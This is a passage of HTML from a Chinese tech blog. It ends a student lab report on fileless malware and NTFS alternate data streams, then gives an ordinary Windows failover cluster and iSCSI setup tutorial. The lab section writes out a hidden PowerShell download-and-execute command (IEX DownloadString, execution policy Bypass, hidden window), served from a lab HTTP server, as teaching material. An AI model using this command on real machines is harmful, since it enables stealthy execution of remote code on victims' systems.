+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Read-MessageBoxDialog</span></span> &#123;</span><br><span class="line">    <span class="variable">$PopUpWin</span> = <span class="built_in">new-object</span> <span class="literal">-comobject</span> wscript.shell</span><br><span class="line">    <span class="variable">$PopUpWin</span>.popup(<span class="string">&quot;Hello World, Welcome to School of Cybersecurity, GPNU!&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Read-MessageBoxDialog</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p><strong>修改当前会话的执行策略</strong></p>
+<p>在 PowerShell 会话中临时修改执行策略（仅对当前会话有效）：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-ExecutionPolicy</span> <span class="literal">-ExecutionPolicy</span> Bypass <span class="literal">-Scope</span> <span class="keyword">Process</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>Scope 参数：<ul>
+<li><code>Process</code>：仅对当前会话生效，关闭会话后恢复默认。</li>
+<li><code>CurrentUser</code>：仅对当前用户生效。</li>
+<li><code>LocalMachine</code>：对所有用户生效（需要管理员权限）。</li>
+</ul>
+</li>
+</ul>
+<p><strong>永久修改执行策略（需慎重）</strong></p>
+<p>如需永久更改执行策略，需使用以下命令（管理员权限）：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-ExecutionPolicy</span> <span class="literal">-ExecutionPolicy</span> Bypass <span class="literal">-Scope</span> LocalMachine</span><br></pre></td></tr></table></figure>
+<p>此命令将执行策略设置为 <strong>Bypass</strong>，本地脚本可执行，远程脚本需签名。</p>
+</blockquote>
+</li>
+</ul>
+</li>
+<li><p><strong>使用PowerShell远程下载并执行脚本</strong>：</p>
+<ul>
+<li><blockquote>
+<p><strong>选择部署的服务器</strong></p>
+<ul>
+<li>您可以使用以下方式部署服务器：<ul>
+<li>使用本地的简单HTTP服务器（如Python的<code>http.server</code>）。</li>
+<li>使用现有的Web服务器（如Apache、Nginx或IIS）。</li>
+<li>使用云服务（如AWS、Azure）。</li>
+</ul>
+</li>
+</ul>
+<p><strong>部署简单HTTP服务器</strong></p>
+<ul>
+<li><p>如果在本地测试，可以使用Python内置的HTTP服务器。</p>
+</li>
+<li><p>在目标目录中（包含<code>test.ps1</code>文件）运行以下命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 8080 --<span class="built_in">bind</span> 0.0.0.0</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>说明</strong>：</p>
+<ul>
+<li><code>8080</code> 是 HTTP 服务使用的端口。</li>
+<li><code>--bind 0.0.0.0</code> 表示服务器绑定到所有可用的网络接口</li>
+</ul>
+</li>
+</ul>
+<img src="/2024/12/03/%E6%97%A0%E6%96%87%E4%BB%B6%E7%97%85%E6%AF%92%E7%9A%84%E5%AE%9A%E4%B9%89%E5%8F%8A%E5%AE%9E%E8%B7%B5/image-20241125235433743.png" class="" title="image-20241125235433743">
+<h3 id="配置-Windows-防火墙"><a href="#配置-Windows-防火墙" class="headerlink" title="配置 Windows 防火墙"></a><strong>配置 Windows 防火墙</strong></h3><p>通过命令行打开防火墙的特定端口（如 8080）：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall firewall add rule name=&quot;Allow Python HTTP&quot; <span class="built_in">dir</span>=<span class="keyword">in</span> action=allow protocol=TCP localport=<span class="number">8080</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>说明：<ul>
+<li><code>name=&quot;Allow Python HTTP&quot;</code> 是规则名称，可以随意更改。</li>
+<li><code>protocol=TCP</code> 指定协议类型为 TCP。</li>
+<li><code>localport=8080</code> 指定开放的端口为 8080。</li>
+</ul>
+</li>
+</ul>
+<p><strong>删除规则</strong>（如果需要删除该规则）：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall firewall delete rule name=&quot;Allow Python HTTP&quot;</span><br></pre></td></tr></table></figure>
+<img src="/2024/12/03/%E6%97%A0%E6%96%87%E4%BB%B6%E7%97%85%E6%AF%92%E7%9A%84%E5%AE%9A%E4%B9%89%E5%8F%8A%E5%AE%9E%E8%B7%B5/image-20241125235419796.png" class="" title="image-20241125235419796">
+<p><strong>确认服务器可用</strong></p>
+<ul>
+<li><p>使用浏览器访问：<code>http://&lt;服务器IP地址&gt;/gpnu.ps1</code>，确保能够下载<code>gpnu.ps1</code>脚本文件。</p>
+<img src="/2024/12/03/%E6%97%A0%E6%96%87%E4%BB%B6%E7%97%85%E6%AF%92%E7%9A%84%E5%AE%9A%E4%B9%89%E5%8F%8A%E5%AE%9E%E8%B7%B5/image-20241125235515664.png" class="" title="image-20241125235515664">
+</li>
+</ul>
+</blockquote>
+</li>
+<li><p>在目标计算机执行以下命令：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe <span class="literal">-ExecutionPolicy</span> Bypass <span class="literal">-WindowStyle</span> <span class="keyword">Hidden</span> <span class="literal">-NoProfile</span> <span class="literal">-NonInteractive</span> <span class="literal">-Command</span> <span class="string">&quot;&amp; &#123;IEX(New-Object Net.WebClient).DownloadString(&#x27;http://10.236.0.54:8080/test.ps1&#x27;)&#125;&quot;</span></span><br></pre></td></tr></table></figure>
+<img src="/2024/12/03/%E6%97%A0%E6%96%87%E4%BB%B6%E7%97%85%E6%AF%92%E7%9A%84%E5%AE%9A%E4%B9%89%E5%8F%8A%E5%AE%9E%E8%B7%B5/image-20241125235635819.png" class="" title="image-20241125235635819">
+<img src="/2024/12/03/%E6%97%A0%E6%96%87%E4%BB%B6%E7%97%85%E6%AF%92%E7%9A%84%E5%AE%9A%E4%B9%89%E5%8F%8A%E5%AE%9E%E8%B7%B5/image-20241125235653052.png" class="" title="image-20241125235653052">
+</li>
+</ul>
+</li>
+<li><p><strong>隐匿执行</strong>：</p>
+<ul>
+<li>使用以下参数隐匿PowerShell窗口：<ul>
+<li><code>-WindowStyle Hidden</code>：隐藏窗口。</li>
+<li><code>-NoLogo</code>：不显示PowerShell启动标志。</li>
+<li><code>-NonInteractive</code>：非交互模式执行。</li>
+</ul>
+</li>
+</ul>
+</li>
+</ol>
+<hr>
+<h4 id="实验结果"><a href="#实验结果" class="headerlink" title="实验结果"></a>实验结果</h4><ol>
+<li><p><strong>ADS数据流文件实验结果</strong>：</p>
+<ul>
+<li>成功创建并验证宿主文件附带的ADS数据流文件和独立的ADS数据流文件。</li>
+<li>使用Notepad和WinHex验证ADS数据流的存在和内容。</li>
+</ul>
+</li>
+<li><p><strong>PowerShell远程下载与隐匿执行实验结果</strong>：</p>
+<ul>
+<li>成功从远程服务器下载并隐匿执行<code>test.ps1</code>脚本，命令行无输出，脚本功能正常执行。</li>
+</ul>
+</li>
+</ol>
+<hr>
+<h4 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h4><ol>
+<li>无文件病毒因其无硬盘落地特性，使得基于文件的传统安全防护难以检测。</li>
+<li>NTFS ADS和PowerShell提供了强大的隐匿能力，但也存在被恶意利用的风险。</li>
+<li>在实际系统中，应通过强化执行策略（如限制PowerShell执行策略）、监控命令使用等手段提升安全性。</li>
+</ol>
+<h4 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h4><ul>
+<li>确保实验环境为虚拟机，避免对生产系统产生影响。</li>
+<li>远程脚本的服务器应具备HTTPS支持以避免被截获和篡改。</li>
+</ul>
+<hr>
+<h4 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h4><ol>
+<li><strong>实验脚本与命令汇总</strong><ul>
+<li>ADS创建命令。</li>
+<li>PowerShell远程执行命令。</li>
+</ul>
+</li>
+<li><strong>工具与参考文献</strong><ul>
+<li>WinHex官方文档。</li>
+<li>PowerShell命令参考。</li>
+</ul>
+</li>
+</ol>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://moyuan10086.github.io/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="moyuan">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Moyuan"s website">
+      <meta itemprop="description" content="prograing or coffee">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | Moyuan"s website">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/" class="post-title-link" itemprop="url">故障转移群集搭建与群集系统安装</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2024-12-03 08:46:58 / 修改时间：08:47:29" itemprop="dateCreated datePublished" datetime="2024-12-03T08:46:58+08:00">2024-12-03</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="故障转移群集搭建与群集系统安装"><a href="#故障转移群集搭建与群集系统安装" class="headerlink" title="故障转移群集搭建与群集系统安装"></a>故障转移群集搭建与群集系统安装</h1><h2 id="一、实验目的"><a href="#一、实验目的" class="headerlink" title="一、实验目的"></a>一、实验目的</h2><ol>
+<li><strong>搭建故障转移群集</strong>：实现服务和应用程序的高可用性。</li>
+<li><strong>群集系统安装环境设置</strong>：掌握搭建环境的配置要求。</li>
+</ol>
+<hr>
+<h2 id="二、实验环境"><a href="#二、实验环境" class="headerlink" title="二、实验环境"></a>二、实验环境</h2><ul>
+<li><strong>操作环境</strong>:  <ul>
+<li>Windows Server 2019  </li>
+<li>SQL Server 2019</li>
+</ul>
+</li>
+<li><strong>实验工具</strong>:  <ul>
+<li>VMware</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h2 id="三、实验原理"><a href="#三、实验原理" class="headerlink" title="三、实验原理"></a>三、实验原理</h2><h3 id="故障转移群集"><a href="#故障转移群集" class="headerlink" title="故障转移群集"></a><strong>故障转移群集</strong></h3><p>故障转移群集通过在多台服务器上部署相同的服务和应用程序，利用监控与自动切换机制，实现单点故障时的服务迁移，提高系统的可用性和容错能力。</p>
+<h3 id="群集系统安装环境设置"><a href="#群集系统安装环境设置" class="headerlink" title="群集系统安装环境设置"></a><strong>群集系统安装环境设置</strong></h3><p>确保以下要求：</p>
+<ul>
+<li>服务器之间的网络连接正常。</li>
+<li>操作系统兼容并满足群集系统要求。</li>
+<li>硬件配置满足最低要求。</li>
+<li>主机名和 IP 地址配置正确。</li>
+</ul>
+<h2 id="四、实验步骤与分析（调整后）"><a href="#四、实验步骤与分析（调整后）" class="headerlink" title="四、实验步骤与分析（调整后）"></a>四、实验步骤与分析（调整后）</h2><h3 id="（一）前期准备"><a href="#（一）前期准备" class="headerlink" title="（一）前期准备"></a>（一）前期准备</h3><h4 id="1-检查IP配置"><a href="#1-检查IP配置" class="headerlink" title="1. 检查IP配置"></a>1. 检查IP配置</h4><div class="table-container">
+<table>
+<thead>
+<tr>
+<th>节点</th>
+<th>Public IP</th>
+<th>Private IP</th>
+<th>群集IP</th>
+<th>域名</th>
+<th>群集名</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Server1</td>
+<td>192.168.80.27</td>
+<td>10.1.1.2</td>
+<td>192.168.80.16</td>
+<td>nodeA</td>
+<td>moyu</td>
+</tr>
+<tr>
+<td>Server2</td>
+<td>192.168.80.32</td>
+<td>10.1.1.3</td>
+<td>192.168.80.16</td>
+<td>nodeB</td>
+<td>moyu</td>
+</tr>
+<tr>
+<td>Master</td>
+<td>192.168.80.82</td>
+<td></td>
+<td></td>
+<td>ha.com</td>
+<td></td>
+</tr>
+<tr>
+<td>NAS</td>
+<td>192.168.80.8</td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+</div>
+<h3 id="（二）使用-NAS-搭建共享存储"><a href="#（二）使用-NAS-搭建共享存储" class="headerlink" title="（二）使用 NAS 搭建共享存储"></a>（二）使用 NAS 搭建共享存储</h3><h4 id="1-创建-Zvol"><a href="#1-创建-Zvol" class="headerlink" title="1. 创建 Zvol"></a><strong>1. 创建 Zvol</strong></h4><ol>
+<li><p><strong>添加 Zvol（块存储）</strong>：</p>
+<ul>
+<li>在 <code>node</code> 存储池下，点击右侧菜单，选择 <code>Add Zvol</code>。</li>
+<li>分别创建以下 Zvol：<ul>
+<li><code>Data</code>：大小为 3GB。</li>
+<li><code>DTC</code>：大小为 1GB。</li>
+<li><code>Zhongcai</code>：大小为 1GB。</li>
+</ul>
+</li>
+<li>配置：<ul>
+<li>设置名称和大小。</li>
+<li>块大小（Block Size）保持默认（16KB 或 4KB）。</li>
+</ul>
+</li>
+</ul>
+<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241126142018775.png" class="" title="image-20241126142018775">
+<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241126143256927.png" class="" title="image-20241126143256927">
+<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241126143409095.png" class="" title="image-20241126143409095">
+</li>
+<li><p><strong>启用 iSCSI 服务</strong>：</p>
+<ul>
+<li>转到 <code>服务 -&gt; iSCSI</code>，启用 iSCSI 服务。</li>
+</ul>
+</li>
+</ol>
+<h4 id="2-配置-iSCSI"><a href="#2-配置-iSCSI" class="headerlink" title="2. 配置 iSCSI"></a><strong>2. 配置 iSCSI</strong></h4><p>配置 iSCSI 以使节点（如 <code>NodeA</code> 和 <code>NodeB</code>）能够访问这些 Zvol。</p>
+<ol>
+<li><p><strong>创建扩展（Extent）</strong>：</p>
+<ul>
+<li><p><strong>路径</strong>：<code>共享 -&gt; 块（iSCSI） -&gt; 扩展</code>。</p>
+</li>
+<li><p><strong>操作</strong>：</p>
+<ul>
+<li>添加扩展：<ul>
+<li>名称：<code>Data_Extent</code>、<code>DTC_Extent</code>、<code>Zhongcai_Extent</code>。</li>
+<li>类型：选择 <code>Device</code>。</li>
+<li>设备：选择您创建的 Zvol（如 <code>Data</code>）。</li>
+</ul>
+</li>
+</ul>
+<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241126143543203.png" class="" title="image-20241126143543203">
+<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241126143653648.png" class="" title="image-20241126143653648">
+</li>
+</ul>
+</li>
+<li><p><strong>创建目标（Target）</strong>：</p>
+<ul>
+<li><p><strong>路径</strong>：<code>共享 -&gt; 块（iSCSI） -&gt; 目标</code>。</p>
+</li>
+<li><p><strong>操作</strong>：</p>
+<ul>
+<li>添加目标：<ul>
+<li>名称：<code>datatarget</code>、<code>dtctarget</code>、<code>zhongcaitarget</code>。</li>
+<li>授权：选择 <code>None</code> 或配置 CHAP 验证。</li>
+<li>Portal Group和发起人组ID均设为1</li>
+</ul>
+</li>
+</ul>
+<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241126144320531.png" class="" title="image-20241126144320531">
+<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241126144048879.png" class="" title="image-20241126144048879">
+</li>
+</ul>
+</li>
+<li><p><strong>关联扩展和目标</strong>（Associated Targets）：</p>
+<ul>
+<li><p><strong>路径</strong>：<code>共享 -&gt; 块（iSCSI） -&gt; 关联</code>。</p>
+</li>
+<li><p><strong>操作</strong>：</p>
+<ul>
+<li>将每个扩展与相应的目标关联,LUN ID设为1。</li>
+</ul>
+<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241126144459126.png" class="" title="image-20241126144459126">
+<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241126144814424.png" class="" title="image-20241126144814424">
+</li>
+</ul>
+</li>
+<li><p>返回 <strong>Target Global Configuration</strong>，保存配置并启用iSCSI服务。</p>
+<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241126144910040.png" class="" title="image-20241126144910040">
+</li>
+</ol>
+<h4 id="3-在节点（NodeA-和-NodeB）上配置-iSCSI"><a href="#3-在节点（NodeA-和-NodeB）上配置-iSCSI" class="headerlink" title="3. 在节点（NodeA 和 NodeB）上配置 iSCSI"></a><strong>3. 在节点（NodeA 和 NodeB）上配置 iSCSI</strong></h4><ol>
+<li><p><strong>启动 iSCSI 发起程序</strong>：</p>
+<ul>
+<li>在 <code>NodeA</code> 和 <code>NodeB</code> 上，搜索并打开 <strong>iSCSI 发起程序</strong>。</li>
+</ul>
+</li>
+<li><p><strong>发现 FreeNAS iSCSI 目标</strong>：</p>
+<ul>
+<li>在 iSCSI 发起程序中：<ul>
+<li>添加门户：输入 FreeNAS 的 IP 地址。</li>
+<li>搜索并发现所有配置的 iSCSI 目标。</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p><strong>连接磁盘</strong>：</p>
+<ul>
+<li>在磁盘管理器中初始化新发现的磁盘。</li>
+<li>将磁盘格式化为 NTFS 或其他适用文件系统。</li>
+</ul>
+</li>
+</ol>
+<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241126145234120.png" class="" title="image-20241126145234120">
+<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241126145256593.png" class="" title="image-20241126145256593">
+<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241126145321873.png" class="" title="image-20241126145321873">
+<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241126145653788.png" class="" title="image-20241126145653788">
+<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241126145829756.png" class="" title="image-20241126145829756"><img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241126150016926.png" class="" title="image-20241126150016926">
+<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241126150241902.png" class="" title="image-20241126150241902">
+<h4 id="4-在群集管理器中挂载磁盘"><a href="#4-在群集管理器中挂载磁盘" class="headerlink" title="4. 在群集管理器中挂载磁盘"></a><strong>4. 在群集管理器中挂载磁盘</strong></h4><ul>
+<li><p>打开 Windows 故障转移群集管理器。</p>
+</li>
+<li><p>添加新的存储，并验证 <code>Data</code>、<code>DTC</code> 和 <code>Zhongcai</code> 能否正确被群集节点访问。</p>
+<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241126151249724.png" class="" title="image-20241126151249724">
+<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241126151342115.png" class="" title="image-20241126151342115">
+</li>
+</ul>
+<hr>
+<h3 id="（四）配置群集仲裁"><a href="#（四）配置群集仲裁" class="headerlink" title="（四）配置群集仲裁"></a>（四）配置群集仲裁</h3><ol>
+<li>在“故障转移群集管理器”中，配置仲裁方式。</li>
+<li>选择“磁盘见证”方式，指定 <code>Zhongcai</code> 磁盘。</li>
+</ol>
+<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241126151708977.png" class="" title="image-20241126151708977">
+<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241126151808851.png" class="" title="image-20241126151808851">
+<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241126151824658.png" class="" title="image-20241126151824658">
+<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241126151849064.png" class="" title="image-20241126151849064">
+<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241126152431842.png" class="" title="image-20241126152431842">
+<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241126152504157.png" class="" title="image-20241126152504157">
+<hr>
+<h3 id="（五）添加-DTC-角色"><a href="#（五）添加-DTC-角色" class="headerlink" title="（五）添加 DTC 角色"></a>（五）添加 DTC 角色</h3><ol>
+<li>在“故障转移群集管理器”中，添加分布事务协调器 (DTC) 角色。</li>
+<li>指定 DTC 角色的磁盘为 <code>DTC</code>，IP 地址为 192.168.80.20。</li>
+</ol>
+<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241126152929156.png" class="" title="image-20241126152929156">
+<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241126152951746.png" class="" title="image-20241126152951746">
+<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241126153114137.png" class="" title="image-20241126153114137">
+<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241126153154932.png" class="" title="image-20241126153154932">
+<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241126153215366.png" class="" title="image-20241126153215366">
+<hr>
+<h3 id="（六）安装-SQL-Server-故障转移"><a href="#（六）安装-SQL-Server-故障转移" class="headerlink" title="（六）安装 SQL Server 故障转移"></a>（六）安装 SQL Server 故障转移</h3><h4 id="在NodeA-上安装-SQL-Server"><a href="#在NodeA-上安装-SQL-Server" class="headerlink" title="在NodeA  上安装 SQL Server"></a><strong>在NodeA  上安装 SQL Server</strong></h4><p>打开 SQL Server <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1Y9WDkIpm9Xbv2mFKbbOnpQ?pwd=ujf4">安装程序</a>，选择 <strong>“新的 SQL Server 故障转移群集安装”</strong>。双击iso ==》setup，然后右侧选择【新的 SOL Server 故障转移群集安装】</p>
+<img src="/2024/12/03/%E6%95%85%E9%9A%9C%E8%BD%AC%E7%A7%BB%E7%BE%A4%E9%9B%86%E6%90%AD%E5%BB%BA%E4%B8%8E%E7%BE%A4%E9%9B%86%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/image-20241127111859030.png" class="" title="image-20241127111859030">
